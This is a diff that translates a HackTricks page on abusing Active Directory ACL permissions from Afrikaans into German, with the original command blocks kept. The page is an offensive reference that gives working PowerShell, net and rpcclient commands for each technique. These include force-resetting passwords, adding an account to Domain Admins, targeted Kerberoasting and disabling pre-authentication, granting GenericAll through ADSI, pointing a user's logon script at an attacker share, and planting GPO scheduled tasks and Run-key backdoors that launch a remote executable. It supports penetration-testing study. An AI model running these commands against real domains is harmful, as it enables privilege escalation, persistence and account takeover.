@@ -1,42 +1,42 @@
-# Misbruik van Active Directory ACLs/ACEs
+# Missbrauch von Active Directory ACLs/ACEs
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
 
-**Hierdie bladsy is meestal 'n opsomming van die tegnieke van** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **en** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Vir meer besonderhede, kyk na die oorspronklike artikels.**
+**Diese Seite ist hauptsächlich eine Zusammenfassung der Techniken von** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **und** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Für weitere Details, überprüfen Sie die Originalartikel.**
 
-## **GenericAll Regte op Gebruiker**
+## **GenericAll-Rechte auf Benutzer**
 
-Hierdie voorreg gee 'n aanvaller volle beheer oor 'n teiken gebruikersrekening. Sodra `GenericAll` regte bevestig is met die `Get-ObjectAcl` opdrag, kan 'n aanvaller:
+Dieses Privileg gewährt einem Angreifer die volle Kontrolle über ein Zielbenutzerkonto. Sobald die `GenericAll`-Rechte mit dem Befehl `Get-ObjectAcl` bestätigt sind, kann ein Angreifer:
 
-* **Verander die Teiken se Wagwoord**: Met `net user <username> <password> /domain`, kan die aanvaller die gebruiker se wagwoord reset.
-* **Teiken Kerberoasting**: Ken 'n SPN aan die gebruiker se rekening toe om dit kerberoastable te maak, gebruik dan Rubeus en targetedKerberoast.py om die ticket-granting ticket (TGT) hashes te onttrek en te probeer kraak.
+* **Das Passwort des Ziels ändern**: Mit `net user <benutzername> <passwort> /domain` kann der Angreifer das Passwort des Benutzers zurücksetzen.
+* **Gezieltes Kerberoasting**: Weisen Sie dem Benutzerkonto ein SPN zu, um es kerberoastable zu machen, und verwenden Sie dann Rubeus und targetedKerberoast.py, um die Ticket-Granting-Ticket (TGT)-Hashes zu extrahieren und zu versuchen, sie zu knacken.
 ```powershell
 Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
 .\Rubeus.exe kerberoast /user:<username> /nowrap
 Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
 ```
-* **Teiken ASREPRoasting**: Deaktiveer vooraf-sertifisering vir die gebruiker, wat hul rekening kwesbaar maak vir ASREPRoasting.
+* **Targeted ASREPRoasting**: Deaktivieren Sie die Vorab-Authentifizierung für den Benutzer, wodurch sein Konto anfällig für ASREPRoasting wird.
 ```powershell
 Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 ```
-## **GenericAll Regte op Groep**
+## **GenericAll-Rechte auf Gruppe**
 
-Hierdie voorreg stel 'n aanvaller in staat om groepslidmaatskappe te manipuleer as hulle `GenericAll` regte op 'n groep soos `Domain Admins` het. Nadat die aanvaller die groep se onderskeidende naam met `Get-NetGroup` geïdentifiseer het, kan hulle:
+Dieses Privileg ermöglicht es einem Angreifer, Gruppenmitgliedschaften zu manipulieren, wenn er `GenericAll`-Rechte auf einer Gruppe wie `Domain Admins` hat. Nachdem der Angreifer den distinguished name der Gruppe mit `Get-NetGroup` identifiziert hat, kann er:
 
-* **Hulself by die Domain Admins Groep Voeg**: Dit kan gedoen word deur direkte opdragte of deur modules soos Active Directory of PowerSploit te gebruik.
+* **Sich Selbst zur Domain Admins Gruppe Hinzufügen**: Dies kann über direkte Befehle oder mithilfe von Modulen wie Active Directory oder PowerSploit erfolgen.
 ```powershell
 net group "domain admins" spotless /add /domain
 Add-ADGroupMember -Identity "domain admins" -Members spotless
@@ -44,35 +44,35 @@ Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.
 ```
 ## **GenericAll / GenericWrite / Write on Computer/User**
 
-Die besit van hierdie voorregte op 'n rekenaarobjek of 'n gebruikersrekening stel in staat tot:
+Das Halten dieser Berechtigungen auf einem Computerobjekt oder einem Benutzerkonto ermöglicht:
 
-* **Kerberos Resource-based Constrained Delegation**: Maak dit moontlik om 'n rekenaarobjek oor te neem.
-* **Shadow Credentials**: Gebruik hierdie tegniek om 'n rekenaar of gebruikersrekening na te volg deur die voorregte te benut om skadu-akkredite te skep.
+* **Kerberos Resource-based Constrained Delegation**: Ermöglicht die Übernahme eines Computerobjekts.
+* **Shadow Credentials**: Verwenden Sie diese Technik, um ein Computer- oder Benutzerkonto zu impersonieren, indem Sie die Berechtigungen zum Erstellen von Shadow Credentials ausnutzen.
 
 ## **WriteProperty on Group**
 
-As 'n gebruiker `WriteProperty` regte op alle objekte vir 'n spesifieke groep (bv., `Domain Admins`) het, kan hulle:
+Wenn ein Benutzer `WriteProperty`-Rechte auf allen Objekten für eine bestimmte Gruppe (z. B. `Domain Admins`) hat, kann er:
 
-* **Hulself by die Domain Admins Groep Voeg**: Bereikbaar deur `net user` en `Add-NetGroupUser` opdragte te kombineer, maak hierdie metode voorregverhoging binne die domein moontlik.
+* **Sich Selbst zur Domain Admins Gruppe Hinzufügen**: Erreichbar durch die Kombination der Befehle `net user` und `Add-NetGroupUser`, ermöglicht diese Methode die Eskalation von Berechtigungen innerhalb der Domäne.
 ```powershell
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
-## **Self (Self-Membership) op Groep**
+## **Selbst (Selbstmitgliedschaft) in Gruppe**
 
-Hierdie voorreg stel aanvallers in staat om hulself by spesifieke groepe, soos `Domain Admins`, te voeg deur opdragte wat groepslidmaatskap direk manipuleer. Deur die volgende opdragreeks te gebruik, kan hulle hulself byvoeg:
+Dieses Privileg ermöglicht Angreifern, sich selbst zu bestimmten Gruppen hinzuzufügen, wie z.B. `Domain Admins`, durch Befehle, die die Gruppenmitgliedschaft direkt manipulieren. Die Verwendung der folgenden Befehlssequenz ermöglicht die Selbsthinzufügung:
 ```powershell
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
-## **WriteProperty (Self-Membership)**
+## **WriteProperty (Selbstmitgliedschaft)**
 
-'n Soortgelyke voorreg, dit laat aanvallers toe om hulself direk by groepe te voeg deur groeps eienskappe te wysig as hulle die `WriteProperty` reg op daardie groepe het. Die bevestiging en uitvoering van hierdie voorreg word uitgevoer met:
+Ein ähnliches Privileg, das Angreifern erlaubt, sich direkt zu Gruppen hinzuzufügen, indem sie die Gruppenattribute ändern, wenn sie das Recht `WriteProperty` für diese Gruppen haben. Die Bestätigung und Ausführung dieses Privilegs erfolgen mit:
 ```powershell
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 net group "domain admins" spotless /add /domain
 ```
 ## **ForceChangePassword**
 
-Die hou van die `ExtendedRight` op 'n gebruiker vir `User-Force-Change-Password` laat wagwoordherstel toe sonder om die huidige wagwoord te ken. Verifikasie van hierdie reg en die benutting daarvan kan gedoen word deur PowerShell of alternatiewe opdraglyn gereedskap, wat verskeie metodes bied om 'n gebruiker se wagwoord te herstel, insluitend interaktiewe sessies en een-liners vir nie-interaktiewe omgewings. Die opdragte wissel van eenvoudige PowerShell-aanroepe tot die gebruik van `rpcclient` op Linux, wat die veelsydigheid van aanvalsvektore demonstreer.
+Das Halten des `ExtendedRight` für einen Benutzer für `User-Force-Change-Password` ermöglicht Passwortzurücksetzungen, ohne das aktuelle Passwort zu kennen. Die Überprüfung dieses Rechts und dessen Ausnutzung kann über PowerShell oder alternative Befehlszeilentools erfolgen, die mehrere Methoden zur Zurücksetzung des Passworts eines Benutzers anbieten, einschließlich interaktiver Sitzungen und Einzeiler für nicht-interaktive Umgebungen. Die Befehle reichen von einfachen PowerShell-Aufrufen bis hin zur Verwendung von `rpcclient` auf Linux, was die Vielseitigkeit der Angriffsvektoren demonstriert.
 ```powershell
 Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainUserPassword -Identity delegate -Verbose
@@ -83,23 +83,23 @@ Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureStri
 rpcclient -U KnownUsername 10.10.10.192
 > setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
 ```
-## **WriteOwner op Groep**
+## **WriteOwner auf Gruppe**
 
-As 'n aanvaller vind dat hulle `WriteOwner` regte oor 'n groep het, kan hulle die eienaarskap van die groep na hulself verander. Dit is veral impakvol wanneer die groep in vraag `Domain Admins` is, aangesien die verandering van eienaarskap breër beheer oor groepattributen en lidmaatskap toelaat. Die proses behels die identifisering van die korrekte objek via `Get-ObjectAcl` en dan die gebruik van `Set-DomainObjectOwner` om die eienaar te wysig, hetsy deur SID of naam.
+Wenn ein Angreifer feststellt, dass er `WriteOwner`-Rechte über eine Gruppe hat, kann er die Eigentümerschaft der Gruppe auf sich selbst ändern. Dies ist besonders wirkungsvoll, wenn es sich bei der betreffenden Gruppe um `Domain Admins` handelt, da die Änderung der Eigentümerschaft eine umfassendere Kontrolle über die Gruppenattribute und die Mitgliedschaft ermöglicht. Der Prozess umfasst die Identifizierung des richtigen Objekts über `Get-ObjectAcl` und dann die Verwendung von `Set-DomainObjectOwner`, um den Eigentümer entweder durch SID oder Namen zu ändern.
 ```powershell
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
 Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 ```
-## **GenericWrite op Gebruiker**
+## **GenericWrite auf Benutzer**
 
-Hierdie toestemming laat 'n aanvaller toe om gebruikers eienskappe te wysig. Spesifiek, met `GenericWrite` toegang, kan die aanvaller die aanmeldskrip pad van 'n gebruiker verander om 'n kwaadwillige skrip uit te voer tydens die gebruiker se aanmelding. Dit word bereik deur die `Set-ADObject` opdrag te gebruik om die `scriptpath` eienskap van die teiken gebruiker op te dateer om na die aanvaller se skrip te verwys.
+Diese Berechtigung ermöglicht es einem Angreifer, Benutzerattribute zu ändern. Insbesondere kann der Angreifer mit `GenericWrite`-Zugriff den Anmeldeskriptpfad eines Benutzers ändern, um ein bösartiges Skript bei der Benutzeranmeldung auszuführen. Dies wird erreicht, indem der Befehl `Set-ADObject` verwendet wird, um die `scriptpath`-Eigenschaft des Zielbenutzers auf das Skript des Angreifers zu aktualisieren.
 ```powershell
 Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
 ```
-## **GenericWrite op Groep**
+## **GenericWrite on Group**
 
-Met hierdie voorreg kan aanvallers groepslidmaatskap manipuleer, soos om hulself of ander gebruikers by spesifieke groepe te voeg. Hierdie proses behels die skep van 'n geloofsbrief objek, dit gebruik om gebruikers by 'n groep te voeg of te verwyder, en die lidmaatskap veranderinge met PowerShell-opdragte te verifieer.
+Mit diesem Privileg können Angreifer die Gruppenmitgliedschaft manipulieren, indem sie sich selbst oder andere Benutzer zu bestimmten Gruppen hinzufügen. Dieser Prozess umfasst das Erstellen eines Anmeldeobjekts, die Verwendung dieses Objekts zum Hinzufügen oder Entfernen von Benutzern aus einer Gruppe und die Überprüfung der Mitgliedschaftsänderungen mit PowerShell-Befehlen.
 ```powershell
 $pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
@@ -109,7 +109,7 @@ Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'use
 ```
 ## **WriteDACL + WriteOwner**
 
-Om 'n AD-objek te besit en `WriteDACL`-privileges daarop te hê, stel 'n aanvaller in staat om vir hulself `GenericAll`-privileges oor die objek toe te ken. Dit word bereik deur ADSI-manipulasie, wat volle beheer oor die objek toelaat en die vermoë om sy groep lidmaatskappe te wysig. Ten spyte hiervan bestaan daar beperkings wanneer daar probeer word om hierdie privileges te benut met die Active Directory-module se `Set-Acl` / `Get-Acl` cmdlets.
+Das Besitzen eines AD-Objekts und das Vorhandensein von `WriteDACL`-Befugnissen darauf ermöglicht es einem Angreifer, sich selbst `GenericAll`-Befugnisse über das Objekt zu gewähren. Dies wird durch ADSI-Manipulation erreicht, die vollständige Kontrolle über das Objekt und die Möglichkeit zur Änderung seiner Gruppenmitgliedschaften ermöglicht. Trotz dessen gibt es Einschränkungen, wenn versucht wird, diese Berechtigungen mit den `Set-Acl` / `Get-Acl`-Cmdlets des Active Directory-Moduls auszunutzen.
 ```powershell
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
 $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
@@ -117,64 +117,64 @@ $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityRe
 $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
 $ADSI.psbase.commitchanges()
 ```
-## **Replika op die Domein (DCSync)**
+## **Replikation im Domänenbereich (DCSync)**
 
-Die DCSync-aanval benut spesifieke replika-regte op die domein om 'n Domeinbeheerder na te boots en data te sinkroniseer, insluitend gebruikersbewyse. Hierdie kragtige tegniek vereis regte soos `DS-Replication-Get-Changes`, wat aanvallers in staat stel om sensitiewe inligting uit die AD-omgewing te onttrek sonder direkte toegang tot 'n Domeinbeheerder. [**Leer meer oor die DCSync-aanval hier.**](../dcsync.md)
+Der DCSync-Angriff nutzt spezifische Replikationsberechtigungen in der Domäne, um einen Domänencontroller zu imitieren und Daten, einschließlich Benutzeranmeldeinformationen, zu synchronisieren. Diese leistungsstarke Technik erfordert Berechtigungen wie `DS-Replication-Get-Changes`, die es Angreifern ermöglichen, sensible Informationen aus der AD-Umgebung zu extrahieren, ohne direkten Zugriff auf einen Domänencontroller zu haben. [**Erfahren Sie hier mehr über den DCSync-Angriff.**](../dcsync.md)
 
-## GPO-delegasie <a href="#gpo-delegation" id="gpo-delegation"></a>
+## GPO-Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>
 
-### GPO-delegasie
+### GPO-Delegation
 
-Gedelegeerde toegang om Groep Beleidsobjekte (GPO's) te bestuur kan beduidende sekuriteitsrisiko's inhou. Byvoorbeeld, as 'n gebruiker soos `offense\spotless` GPO-bestuursregte gedelegeer word, kan hulle regte hê soos **WriteProperty**, **WriteDacl**, en **WriteOwner**. Hierdie regte kan misbruik word vir kwaadwillige doeleindes, soos geïdentifiseer met PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+Delegierter Zugriff zur Verwaltung von Gruppenrichtlinienobjekten (GPOs) kann erhebliche Sicherheitsrisiken darstellen. Wenn beispielsweise ein Benutzer wie `offense\spotless` die GPO-Verwaltungsrechte delegiert bekommt, kann er über Berechtigungen wie **WriteProperty**, **WriteDacl** und **WriteOwner** verfügen. Diese Berechtigungen können für böswillige Zwecke missbraucht werden, wie mit PowerView identifiziert: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
-### Enumereer GPO-regte
+### GPO-Berechtigungen auflisten
 
-Om verkeerd geconfigureerde GPO's te identifiseer, kan PowerSploit se cmdlets saamgeketting word. Dit stel die ontdekking van GPO's wat 'n spesifieke gebruiker regte het om te bestuur, moontlik: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+Um falsch konfigurierte GPOs zu identifizieren, können die Cmdlets von PowerSploit miteinander verknüpft werden. Dies ermöglicht die Entdeckung von GPOs, für die ein bestimmter Benutzer Berechtigungen zur Verwaltung hat: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
-**Rekenaars met 'n Gegewe Beleid Toegepas**: Dit is moontlik om te bepaal watter rekenaars 'n spesifieke GPO van toepassing is, wat help om die omvang van potensiële impak te verstaan. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
+**Computer mit einer bestimmten Richtlinie angewendet**: Es ist möglich zu ermitteln, auf welche Computer eine bestimmte GPO angewendet wird, was hilft, den Umfang der potenziellen Auswirkungen zu verstehen. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
 
-**Beleide Toegepas op 'n Gegewe Rekenaar**: Om te sien watter beleide op 'n spesifieke rekenaar toegepas is, kan opdragte soos `Get-DomainGPO` gebruik word.
+**Richtlinien, die auf einen bestimmten Computer angewendet werden**: Um zu sehen, welche Richtlinien auf einen bestimmten Computer angewendet werden, können Befehle wie `Get-DomainGPO` verwendet werden.
 
-**OUs met 'n Gegewe Beleid Toegepas**: Om organisatoriese eenhede (OUs) wat deur 'n gegewe beleid geraak word, te identifiseer, kan `Get-DomainOU` gebruik word.
+**OUs mit einer bestimmten Richtlinie angewendet**: Die Identifizierung von organisatorischen Einheiten (OUs), die von einer bestimmten Richtlinie betroffen sind, kann mit `Get-DomainOU` erfolgen.
 
-### Misbruik GPO - New-GPOImmediateTask
+### Missbrauch von GPO - New-GPOImmediateTask
 
-Verkeerd geconfigureerde GPO's kan benut word om kode uit te voer, byvoorbeeld, deur 'n onmiddellike geskeduleerde taak te skep. Dit kan gedoen word om 'n gebruiker by die plaaslike administrateursgroep op geraakte masjiene te voeg, wat regte beduidend verhoog:
+Falsch konfigurierte GPOs können ausgenutzt werden, um Code auszuführen, beispielsweise durch das Erstellen einer sofortigen geplanten Aufgabe. Dies kann durchgeführt werden, um einen Benutzer zur lokalen Administratorgruppe auf betroffenen Maschinen hinzuzufügen, was die Berechtigungen erheblich erhöht:
 ```powershell
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
-### GroupPolicy module - Misbruik GPO
+### GroupPolicy-Modul - Missbrauch von GPO
 
-Die GroupPolicy-module, indien geïnstalleer, stel die gebruiker in staat om nuwe GPO's te skep en te koppel, en om voorkeure soos registerwaardes in te stel om agterdeure op die geraakte rekenaars uit te voer. Hierdie metode vereis dat die GPO opgedateer word en dat 'n gebruiker op die rekenaar aanmeld vir uitvoering:
+Das GroupPolicy-Modul, sofern installiert, ermöglicht die Erstellung und Verknüpfung neuer GPOs sowie das Festlegen von Präferenzen wie Registrierungswerten, um Backdoors auf betroffenen Computern auszuführen. Diese Methode erfordert, dass die GPO aktualisiert wird und ein Benutzer sich am Computer anmeldet, um die Ausführung zu ermöglichen:
 ```powershell
 New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
 Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
 ```
-### SharpGPOAbuse - Misbruik GPO
+### SharpGPOAbuse - Missbrauch von GPO
 
-SharpGPOAbuse bied 'n metode om bestaande GPO's te misbruik deur take by te voeg of instellings te wysig sonder die behoefte om nuwe GPO's te skep. Hierdie hulpmiddel vereis die wysiging van bestaande GPO's of die gebruik van RSAT-hulpmiddels om nuwe te skep voordat veranderinge toegepas word:
+SharpGPOAbuse bietet eine Methode, um bestehende GPOs zu missbrauchen, indem Aufgaben hinzugefügt oder Einstellungen geändert werden, ohne neue GPOs erstellen zu müssen. Dieses Tool erfordert die Modifikation bestehender GPOs oder die Verwendung von RSAT-Tools, um neue zu erstellen, bevor Änderungen angewendet werden:
 ```bash
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
 ```
-### Force Policy Update
+### Zwangsweise Richtlinienaktualisierung
 
-GPO-opdaterings gebeur tipies elke 90 minute. Om hierdie proses te versnel, veral na die implementering van 'n verandering, kan die `gpupdate /force` opdrag op die teikenrekenaar gebruik word om 'n onmiddellike beleidsopdatering af te dwing. Hierdie opdrag verseker dat enige wysigings aan GPO's toegepas word sonder om te wag vir die volgende outomatiese opdateringsiklus.
+GPO-Updates erfolgen typischerweise alle 90 Minuten. Um diesen Prozess zu beschleunigen, insbesondere nach der Implementierung einer Änderung, kann der Befehl `gpupdate /force` auf dem Zielcomputer verwendet werden, um eine sofortige Richtlinienaktualisierung zu erzwingen. Dieser Befehl stellt sicher, dass alle Änderungen an GPOs angewendet werden, ohne auf den nächsten automatischen Aktualisierungszyklus zu warten.
 
-### Under the Hood
+### Unter der Haube
 
-By inspeksie van die Geskeduleerde Take vir 'n gegewe GPO, soos die `Misconfigured Policy`, kan die toevoeging van take soos `evilTask` bevestig word. Hierdie take word geskep deur middel van skripte of opdraglyn gereedskap wat daarop gemik is om stelsels gedrag te verander of voorregte te verhoog.
+Bei der Überprüfung der geplanten Aufgaben für ein bestimmtes GPO, wie die `Misconfigured Policy`, kann die Hinzufügung von Aufgaben wie `evilTask` bestätigt werden. Diese Aufgaben werden durch Skripte oder Befehlszeilenwerkzeuge erstellt, die darauf abzielen, das Systemverhalten zu ändern oder Berechtigungen zu eskalieren.
 
-Die struktuur van die taak, soos getoon in die XML-konfigurasie lêer wat deur `New-GPOImmediateTask` gegenereer is, skets die spesifikasies van die geskeduleerde taak - insluitend die opdrag wat uitgevoer moet word en sy triggers. Hierdie lêer verteenwoordig hoe geskeduleerde take gedefinieer en bestuur word binne GPO's, wat 'n metode bied om arbitrêre opdragte of skripte as deel van beleidsafdwinging uit te voer.
+Die Struktur der Aufgabe, wie sie in der von `New-GPOImmediateTask` generierten XML-Konfigurationsdatei dargestellt ist, beschreibt die Einzelheiten der geplanten Aufgabe - einschließlich des auszuführenden Befehls und seiner Auslöser. Diese Datei zeigt, wie geplante Aufgaben innerhalb von GPOs definiert und verwaltet werden, und bietet eine Methode zur Ausführung beliebiger Befehle oder Skripte im Rahmen der Durchsetzung von Richtlinien.
 
-### Users and Groups
+### Benutzer und Gruppen
 
-GPO's laat ook die manipulasie van gebruiker en groep lidmaatskap op teikenstelsels toe. Deur die Gebruikers en Groepe beleidslêers direk te redigeer, kan aanvallers gebruikers aan bevoorregte groepe, soos die plaaslike `administrators` groep, toevoeg. Dit is moontlik deur die delegasie van GPO bestuur toestemming, wat die wysiging van beleidslêers toelaat om nuwe gebruikers in te sluit of groep lidmaatskappe te verander.
+GPOs ermöglichen auch die Manipulation von Benutzer- und Gruppenmitgliedschaften auf Zielsystemen. Durch das direkte Bearbeiten der Benutzer- und Gruppendateien können Angreifer Benutzer zu privilegierten Gruppen, wie der lokalen `administrators`-Gruppe, hinzufügen. Dies ist durch die Delegation von GPO-Verwaltungsberechtigungen möglich, die die Modifikation von Richtliniendateien erlaubt, um neue Benutzer hinzuzufügen oder Gruppenmitgliedschaften zu ändern.
 
-Die XML-konfigurasie lêer vir Gebruikers en Groepe skets hoe hierdie veranderinge geïmplementeer word. Deur inskrywings aan hierdie lêer toe te voeg, kan spesifieke gebruikers verhoogde voorregte oor die geraakte stelsels verleen word. Hierdie metode bied 'n direkte benadering tot voorregverhoging deur GPO manipulasie.
+Die XML-Konfigurationsdatei für Benutzer und Gruppen beschreibt, wie diese Änderungen umgesetzt werden. Durch das Hinzufügen von Einträgen zu dieser Datei können bestimmten Benutzern erhöhte Berechtigungen auf betroffenen Systemen gewährt werden. Diese Methode bietet einen direkten Ansatz zur Berechtigungseskalation durch GPO-Manipulation.
 
-Verder kan addisionele metodes vir die uitvoering van kode of die handhawing van volharding, soos die benutting van aanmeld/afmeld skripte, die wysiging van registriesleutels vir autoruns, die installering van sagteware via .msi lêers, of die redigering van dienskonfigurasies, ook oorweeg word. Hierdie tegnieke bied verskeie roetes om toegang te handhaaf en teikenstelsels te beheer deur die misbruik van GPO's.
+Darüber hinaus können auch zusätzliche Methoden zur Ausführung von Code oder zur Aufrechterhaltung der Persistenz in Betracht gezogen werden, wie die Nutzung von Anmelde-/Abmeldeskripten, das Ändern von Registrierungsschlüsseln für Autostarts, die Installation von Software über .msi-Dateien oder das Bearbeiten von Dienstkonfigurationen. Diese Techniken bieten verschiedene Möglichkeiten, um den Zugriff aufrechtzuerhalten und Zielsysteme durch den Missbrauch von GPOs zu kontrollieren.
 
-## References
+## Referenzen
 
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
 * [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
